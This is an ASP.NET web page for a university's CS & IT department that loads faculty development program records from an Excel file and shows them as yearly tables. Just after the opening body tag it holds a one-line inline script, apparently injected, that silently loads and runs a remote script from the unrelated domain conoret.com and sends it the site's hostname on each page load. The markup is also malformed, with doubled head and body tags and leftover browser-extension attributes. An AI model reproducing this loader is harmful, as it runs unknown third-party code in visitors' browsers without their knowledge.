<%@ Page Language="C#" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CS & IT - Faculty FDP Details (Latest First)</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 40px; background: #f5f7fa; color: #2c3e50; line-height: 1.6; }
        .container { max-width: 1300px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #2c3e50; }
        h2 { color: #2980b9; border-bottom: 3px solid #3498db; padding-bottom: 10px; }
        h3 { color: #e74c3c; margin-top: 40px; }
        table { width: 100%; border-collapse: collapse; margin: 25px 0; background: white; }
        th, td { border: 1px solid #ddd; padding: 12px 15px; text-align: left; }
        th { background: #3498db; color: white; font-weight: 600; }
        tr:nth-child(even) { background-color: #f8fbff; }
        tr:hover { background-color: #eaf4ff; }
        .summary-table th { background: #27ae60; }
        .loading { text-align: center; font-size: 1.3em; color: #2980b9; padding: 40px; }
        .error { color: #e74c3c; background: #fdf2f2; padding: 20px; border-radius: 8px; border: 1px solid #fababa; }
        .fdp-item { margin: 8px 0; }
        .fdp-item strong { color: #2c3e50; }



           <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,500i,700,900&amp;display=swap" rel="stylesheet">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/styles.css">
    <link rel="stylesheet" href="css/responsive.css">
    
<title>Vision &amp; Mission | Program of CSE IT</title> 

<style id="monica-reading-highlight-style">
        .monica-reading-highlight {
          animation: fadeInOut 1.5s ease-in-out;
        }

        @keyframes fadeInOut {
          0%, 100% { background-color: transparent; }
          30%, 70% { background-color: rgba(2, 118, 255, 0.20); }
        }
      </style></head>
<body data-new-gr-c-s-check-loaded="14.1264.0" data-gr-ext-installed="" monica-id="ofpnmcalabcbjgholdjcjblkibolbppb" monica-version="7.9.8"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>



<!--admission style slide button-->

<style>

.trigger_popup {
                    transform: rotate(90deg) !important;
                    position: fixed;
                    top: 66%;
                   right:-46px;
                    z-index: 999;
                    cursor: pointer;
                    background-color: #b8292f;
                    border-color: #b8292f;
                    border-radius: 5px;
                    border-bottom-right-radius: 0;
                    border-bottom-left-radius: 0;
                    padding: 10px 22px;
                    font-size: 18px;
                    color: #fff;
                    line-height: 1.33;                  
                }
.trigger_popup:hover {
                    background-color: #d63232;
                    border-color: #d63232;
                }

/* The Modal (background) */
.modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 9999; /* Sit on top */
  padding-top: 35px; /* Location of the box */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content */
.modal-content {
  background-color: transparent;
  margin: auto;
  padding: 0;
  border: 0px solid #888;
  max-width: 390px;
  position: relative;
}

/* The Close Button */
.close {
    color: #c1c1c1;
    float: right;
    font-size: 30px;
    font-weight: bold;
    position: absolute;
    right: 15px;
    z-index: 9999;
    top: 2px;
}

.close:hover,
.close:focus {
  color: #797878;
  text-decoration: none;
  cursor: pointer;
}
.head_text {
    background-color: #dd3333;
    color: #fff;
    text-align: center;
    padding: 7px;
    font-size: 20px;
    border-top-left-radius: 35px;
}

@media (max-width:768px) {
    .trigger_popup {
        transform: rotate(0deg) !important;
        bottom: 0;
        top: 95%;
        right: unset;
        margin: 0;
        left: 15%;
        font-size: 14px;
        padding: 8px 10px;
    }
    .popupCloseButton {
        top: -10px;
        right: -2px;
    }
}
    </style>
</head>
<body>


<a href="https://admissions.kluniversity.in/" target="_blank" class="trigger_popup">Apply Now</a>
<img src="https://www.kluniversity.in/img/KLU-Hedder-main.jpg" style="width: 100%; height: auto" alt="">
    <div style="width: 100%; color: white; height: 1px; background-color: white"></div>
    <div class="head123">
      <div class="container">
        <div class="row">
          <div class="col-md-12 text-center">
            <h2 style="font-size: 20px; padding: 5px 0px; margin-bottom: 5px">
              Computer Science &amp; Information Technology
            </h2>
          </div>
        </div>
      </div>
    </div>
    <div id="navbar_top" style="width: 100%; background-color: #e6c1c1">
      <div class="container">
        <!-- ======================================Navigation Bar================================================= -->
        <nav class="navbar navbar-expand-lg navStyle justify-content-cente">
          <!-- <a class="brand-navbar" href="Default.aspx"
            ><img src="images/logo.png" alt="Responsive image" height="60px"
          /></a> -->
          <button class="navbar-toggler" data-toggle="collapse" data-target="#mainMenu">
            <span><i class="fas fa-align-right iconStyle"></i></span>
          </button>
          <div class="collapse navbar-collapse justify-content-center" id="mainMenu">
            <ul class="navbar-nav">
              <li class="nav-item">
                <a href="../default.aspx" class="nav-link">KLEF Home</a>
              </li>
               <li class="nav-item dropdown">
                <a class="nav-link dropdown-toggle" href="Default.aspx" id="A1" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Home</a>
                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                <a class="dropdown-item" href="About.aspx">About CS&amp;IT</a>
              <a class="dropdown-item" href="vision.aspx">Vision &amp; Mission</a>
                   <a class="dropdown-item" href="#">Hod Profile</a> 
                    </div>
                  </li>
                     <li class="nav-item dropdown">
                <a class="nav-link dropdown-toggle" href="#" id="A1" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Academics</a>
                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                <a class="dropdown-item" href="Academics.aspx">About Academics</a>
                <a class="dropdown-item" href="aprograms.aspx">Academic Programs</a>
                <a class="dropdown-item" href="https://www.kluniversity.in/site/acadcal.htm" target="_blank">Acedemic calender</a> 
                    </div>
                  </li>
                    <!-- <li class="nav-item">
                        <a href="Faculty.aspx" class="nav-link">Faculty</a>
                    </li> -->
                  <li class="nav-item dropdown">
                    <a class="nav-link dropdown-toggle" href="#" id="A1" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
Student Progression
                    </a>
                    <div class="dropdown-menu" aria-labelledby="navbarDropdown">
            <a class="dropdown-item" href="placements.aspx">Placements</a>
                             <a class="dropdown-item" href="hstudyes.aspx">Higher Studies</a>
         <a class="dropdown-item" href="https://www.kluniversity.in/ips" target="_blank">Practice School</a>
        <a class="dropdown-item" href="certification.aspx">Student Global Certificates </a>  
                    </div>
                  </li>
 
                           <li class="nav-item dropdown">
                <a class="nav-link dropdown-toggle" href="#" id="A1" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Faculty</a>
                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                <a class="dropdown-item" href="#">Faculty Awards</a>
                <a class="dropdown-item" href="ac.aspx">Publications</a>
                <a class="dropdown-item" href="#">FDPs</a>
             <a class="dropdown-item" href="fcert.aspx">Faculty Global Certificates </a>    
                    </div>
                  </li>

                     <li class="nav-item">
                        <a href="Contact.aspx" class="nav-link">Contact</a>
                    </li>
                   <!-- <li class="nav-item">
                        <a href="https://www.kluniversity.in/"target="_blank" class="nav-link">  KLU Home</a>
                    </li> -->
                   
                <li class="nav-item dropdown">
                <a class="nav-link dropdown-toggle" href="#" id="A1" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Activities</a>
                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                 <a class="dropdown-item" href="counselling.aspx">Counselling</a>
                    <a class="dropdown-item" href="nss.aspx">NSS</a>
                      <a class="dropdown-item" href="sports.aspx">Sports</a>
                          <a class="dropdown-item" href="sclubs.aspx">Student Clubs</a>
                </div>
                </li>

                </ul>
            </div>
        </nav>
</div>
</div>
        
<div style="width:100%">
<img src="images/csit.jpg" class="img-fluid img-thumbnail" style="width:100%"> 
<h5 class="titlecourselist">Vision &amp; Mission</h5>
</div>

    <div class="container">
        <h1>CS & IT Department<br><small>Faculty Development Programs (FDP) Attended</small></h1>
        <div id="loading" class="loading">Loading FDP data from Excel file...</div>
        <div id="content" style="display:none;">
            <div id="summary"></div>
            <div id="details"></div>
        </div>
    </div>

    <script>
        // Change this if your file is in a subfolder
        const excelFilePath = "../CS & IT - FDP DETAILS.xlsx";

        // Define the order: Latest year first
        const yearOrder = ["2024-2025", "2023-2024", "2022-2023"];

        fetch(excelFilePath)
            .then(response => {
                if (!response.ok) throw new Error("File not found. Make sure the Excel file is in the same folder.");
                return response.arrayBuffer();
            })
            .then(data => {
                const workbook = XLSX.read(data, { type: "array" });
                const sheetNames = workbook.SheetNames;

                const summary = {};
                const details = {};

                // Process all sheets
                sheetNames.forEach(sheetName => {
                    const ws = workbook.Sheets[sheetName];
                    const rows = XLSX.utils.sheet_to_json(ws, { header: 1, defval: "" });
                    const dataRows = rows.slice(2); // Skip title & header row

                    const facultySet = new Set();
                    const yearDetails = {};

                    dataRows.forEach(row => {
                        if (row.length < 10 || !row[1]) return;
                        const empId = row[1].toString().trim();
                        const name = (row[2] || "Name Not Available").trim();
                        const fdpTitle = (row[8] || "FDP Title Missing").trim();
                        const dates = (row[9] || "Dates Not Available").trim();

                        facultySet.add(empId);

                        if (!yearDetails[empId]) {
                            yearDetails[empId] = { name: name, fdps: [] };
                        }
                        yearDetails[empId].fdps.push({ title: fdpTitle, dates: dates });
                    });

                    summary[sheetName] = { unique: facultySet.size, total: dataRows.length };
                    details[sheetName] = yearDetails;
                });

                // Build Summary Table
                let summaryHTML = `<h2>Summary (Latest First)</h2>
                    <table class="summary-table">
                        <tr><th>Academic Year</th><th>Unique Faculty</th><th>Total FDP Entries</th></tr>`;
                yearOrder.forEach(year => {
                    if (summary[year]) {
                        summaryHTML += `<tr>
                            <td><strong>${year}</strong></td>
                            <td>${summary[year].unique}</td>
                            <td>${summary[year].total}</td>
                        </tr>`;
                    }
                });
                summaryHTML += `</table>`;
                document.getElementById("summary").innerHTML = summaryHTML;

                // Build Detailed Tables (Latest first)
                let detailsHTML = `<h2>Detailed FDP Records (Latest Year First)</h2>`;
                yearOrder.forEach(year => {
                    if (!details[year] || Object.keys(details[year]).length === 0) return;

                    detailsHTML += `<h3>${year}</h3>
                        <table>
                            <tr><th>EMP ID</th><th>Faculty Name</th><th>FDP Attended (with Dates)</th></tr>`;

                    // Sort EMP IDs numerically
                    Object.keys(details[year]).sort((a, b) => a - b).forEach(empId => {
                        const fac = details[year][empId];
                        const fdpList = fac.fdps
                            .map(f => `<div class="fdp-item">• ${f.title} <strong>(${f.dates})</strong></div>`)
                            .join("");

                        detailsHTML += `<tr>
                            <td><strong>${empId}</strong></td>
                            <td>${fac.name}</td>
                            <td>${fdpList}</td>
                        </tr>`;
                    });
                    detailsHTML += `</table>`;
                });

                document.getElementById("details").innerHTML = detailsHTML;
                document.getElementById("loading").style.display = "none";
                document.getElementById("content").style.display = "block";
            })
            .catch(err => {
                document.getElementById("loading").innerHTML = 
                    `<div class="error">
                        <strong>Error Loading Data:</strong><br>${err.message}<br><br>
                        Please make sure:<br>
                        • The file name is exactly: <strong>${excelFilePath}</strong><br>
                        • The file is in the <strong>same folder</strong> as this HTML file<br>
                        • You're opening this page via a local server (not directly from file:// in some browsers)
                     </div>`;
            });
    </script>
</body>
</html>